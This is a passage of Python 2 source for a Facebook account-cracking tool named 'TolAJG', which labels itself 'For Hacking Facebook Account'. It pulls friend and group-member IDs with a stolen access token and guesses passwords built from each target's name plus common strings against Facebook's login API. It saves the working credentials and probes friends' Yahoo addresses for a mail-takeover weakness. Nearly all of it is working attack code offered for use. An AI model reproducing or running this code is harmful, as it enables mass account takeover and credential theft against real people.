        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t     \t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        idlist = raw_input('\x1b[1;97m[?] \x1b[1;97mFile ID  \x1b[1;97m: \x1b[1;97m')
        passw = raw_input('\x1b[1;97m[?] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            run('Wait....')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\nPress Any to Continue....')
            menu_hack()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        os.mkdir('ajg')
    except OSError:
        pass
    else:
        try:
            buka = open(idlist, 'r')
            up = buka.read().split()
            while file:
                username = file.readline().strip()
                url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                data = urllib.urlopen(url)
                mpsh = json.load(data)
                if back == len(up):
                    break
                if 'access_token' in mpsh:
                    bisa = open('ajg/mbf_ok.txt', 'w')
                    bisa.write(username + '|' + passw + '\n')
                    bisa.close()
                    x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                    z = json.loads(x.text)
                    berhasil.append('\x1b[1;97m[ \x1b[1;97m\xe2\x9c\x93\x1b[1;97m ] ' + username + '|' + passw + ' [~>' + z['name'])
                elif 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('out/mbf_cp.txt', 'w')
                    cek.write(username + '|' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[ \x1b[1;97m+\x1b[1;97m ] ' + username + '|' + passw)
                else:
                    gagal.append(username)
                    back += 1
                sys.stdout.write('\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;95mTotal \x1b[1;91m: \x1b[1;97m[' + str(len(up)) + '\x1b[1;97m] \x1b[1;91m[~>\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;92mCrack \x1b[1;91m:\x1b[1;97m [\x1b[1;91m' + str(back) + '\x1b[1;97m] \x1b[1;97m[\x1b[1;92Live\xe2\x88\x9a\x1b[1;97m] \x1b[1;91m: \x1b[1;97m[\x1b[1;96m' + str(len(berhasil)) + '\x1b[1;97m] \x1b[1;97m[\x1b[1;93mCheckX\x1b[1;97m] \x1b[1;91m: \x1b[1;97m[\x1b[1;96m' + str(len(cekpoint)) + '\x1b[1;97m]')
                sys.stdout.flush()

        except IOError:
            print '\n\x1b[1;91m[!] Sleep'
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'


def hasil():
    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t     \t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('\t     \t\t \t     \t\t [!]Menu:')
    run("\n[1.]Hack From list Friend\n[2.]Hack From ID Friend\n[3.]Hack From ID Member Grup'\n")
    pilih_super()


def pilih_super():
    global oks
    peak = raw_input('[\xe2\x80\xa2 TolAJG \xe2\x80\xa2 ] : ')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    elif peak == '1':
        os.system('reset')
        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t     \t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        run('Wait...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2':
        os.system('reset')
        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t     \t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        run('[!]Input ID/Username Friend ')
        idt = raw_input('\x1b[1;91m[+] \x1b[1;96mInput ID friend \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom\x1b[1;91m [~>\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\nPress Any to Continue....')
            super()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3':
        os.system('reset')
        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t     \t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        run(' ')
        idg = raw_input('\x1b[1;91m[+] \x1b[1;96mInput ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom group \x1b[1;91m[~>\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\nPress Any to Continue....')
            super()

        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])

    elif peak == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    run('\x1b[1;97m[+] \x1b[1;97mTotal ID \x1b[1;97m: \x1b[1;97m' + str(len(id)))
    titik = ['./ ', '..\\ ', '.../ ', '....\\ ', '...../']
    os.system('reset')
    run('\x1b[1;91m[\x1b[1;97m\xe2\x88\x9a\x1b[1;91m]\x1b[1;96mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id)))
    run('\x1b[1;96m\n[\x1b[1;96m===\x1b[1;92m[\x1b[1;97mID\x1b[1;92m]\x1b[1;96m===] \x1b[1;91m[\x1b[1;97m~> \x1b[1;96m[===\x1b[1;92m[\x1b[1;97mPassword\x1b[1;92m]\x1b[1;96m===] \x1b[1;91m[\x1b[1;97m~> \x1b[1;96m[===\x1b[1;92m[\x1b[1;97mName\x1b[1;92m]\x1b[1;96m===]\n\t')

    def main(arg):
        user = arg
        try:
            os.mkdir('ajg')
        except OSError:
            pass
        else:
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass2 + '\n')
                        cek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            pass4 = 'kontol123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'indonesia123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'sayang'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass7 = b['first_name'] + '321'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass7 + ' =>' + z['name']
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    run('[\xe2\x88\x9a]Finish...')
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;91m[\x1b[1;92m' + str(len(oks)) + '\x1b[1;91m]\x1b[1;97m/\x1b[1;91m[\x1b[1;93m' + str(len(cekpoint)) + '\x1b[1;91m]'
    print '\x1b[1;97m[\x1c[1;92m+\x1b[1;97m] \x1b[1;91mCP File saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\nPress Any to Continue....')
    super()


def menu_yahoo():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
    run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('----------' + '[Menu Yahoo Cloning]' + '----------')
    print '               ' + '[\xe2\x80\xa2]Menu:'
    run('\x1b[1;97m[\x1b[1;92m1\x1b[1;97m]\x1b[1;92mClone With List Friend')
    run('\x1b[1;97m[\x1b[1;92m2\x1b[1;97m]\x1b[1;92mClone From Friend')
    run('\x1b[1;97m[\x1b[1;92m3\x1b[1;97m]\x1b[1;92mClone From List Member Grup')
    run('\x1b[1;97m[\x1b[1;92m0\x1b[1;97m]\x1b[1;92mBack')
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('[\xe2\x80\xa2 TolAJG \xe2\x80\xa2 ] : ')
    if go == '':
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()
    elif go == '1':
        yahoofriends()
    elif go == '2':
        yahoofromfriends()
    elif go == '3':
        yahoomember()
    elif go == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()


def yahoofriends():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
    run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    mpsh = []
    jml = 0
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('ajg/MailVuln.txt', 'w')
    run(52 * '\x1b[1;97m-')
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    run(52 * '\x1b[1;97m-')
    run('\x1b[1;97m[\xe2\x88\x9a]\x1b[1;92mFinish')
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m ajg/MailVuln.txt'
    save.close()
    raw_input('\nPress Any to Continue....')
    menu_yahoo()


def yahoofromfriends():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

        os.system('reset')
        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
        run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
        run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
        run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
        mpsh = []
        jml = 0
        idt = raw_input('\x1b[1;91m[+] \x1b[1;96mInput ID friend \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('ajg/FriendMailVuln.txt', 'w')
    print 42 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
